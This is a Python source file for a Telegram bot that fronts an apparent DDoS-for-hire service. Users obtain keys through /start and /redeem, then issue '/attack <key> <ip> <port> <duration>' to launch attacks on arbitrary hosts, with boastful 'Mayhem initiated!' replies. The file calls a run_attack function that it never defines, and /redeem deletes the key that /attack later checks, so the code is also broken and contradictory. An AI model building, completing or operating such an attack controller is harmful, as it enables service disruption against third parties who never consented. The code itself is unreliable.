import asyncio
import secrets
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
ADMIN_USER_ID = 6942423757
USERS_FILE = 'users.txt'
KEYS_FILE = 'keys.txt'
attack_in_progress = False


# Function to load users from file
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()


# Function to load keys from file
def load_keys():
    keys = {}
    try:
        with open(KEYS_FILE) as f:
            for line in f:
                user_id, key = line.strip().split(',')
                keys[user_id] = key
    except FileNotFoundError:
        pass
    return keys


# Function to save users to file
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)


# Function to save keys to file
def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        for user_id, key in keys.items():
            f.write(f"{user_id},{key}\n")


# Function to generate a random key
def generate_key():
    characters = string.ascii_letters + string.digits
    return ''.join(secrets.choice(characters) for _ in range(6))


# Load existing data
users = load_users()
keys = load_keys()


# /start command handler
async def start(update: Update, context: CallbackContext):
    chat_id = str(update.effective_chat.id)
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <key> <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*\n\n"
        "To gain access, please contact the admin to receive your unique key."
    )

    if chat_id not in keys:
        key = generate_key()
        keys[chat_id] = key
        save_keys(keys)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"Your unique key is: {key}\nKeep it safe and use it with the /attack command.",
            parse_mode='Markdown'
        )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')


# /key command handler
async def key(update: Update, context: CallbackContext):
    chat_id = str(update.effective_chat.id)
    if chat_id in keys:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"Your unique key is: {keys[chat_id]}\nKeep it safe and use it with the /attack command.",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ You do not have a key yet. Please contact the admin to get your key.*",
            parse_mode='Markdown'
        )


# /redeem command handler
async def redeem(update: Update, context: CallbackContext):
    chat_id = str(update.effective_chat.id)
    user_id = str(update.effective_user.id)
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /redeem <key>*\nPlease provide a valid key.",
            parse_mode='Markdown'
        )
        return

    key = args[0]
    if chat_id in keys and keys[chat_id] == key:
        users.add(user_id)
        save_users(users)

        del keys[chat_id]
        save_keys(keys)

        await context.bot.send_message(
            chat_id=chat_id,
            text="*🎉 Key redeemed successfully! You now have access to the bot's features.*",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Invalid key! Please contact the admin if you believe this is a mistake.*",
            parse_mode='Markdown'
        )


# /attack command handler
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    chat_id = str(update.effective_chat.id)
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <key> <ip> <port> <duration>*", parse_mode='Markdown')
        return

    key, ip, port, duration = args

    if chat_id not in keys or keys[chat_id] != key:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid key. Please provide the correct key to use the attack command.*", parse_mode='Markdown')
        return

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*⚔️ Attack Launched! ⚔️*\n*🎯 Target: {ip}:{port}*\n*🕒 Duration: {duration} seconds*\n*🔥 Mayhem initiated! Let the battlefield ignite! 💥*",
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))


# Main function to set up handlers
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("key", key))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()


if __name__ == "__main__":
    main()
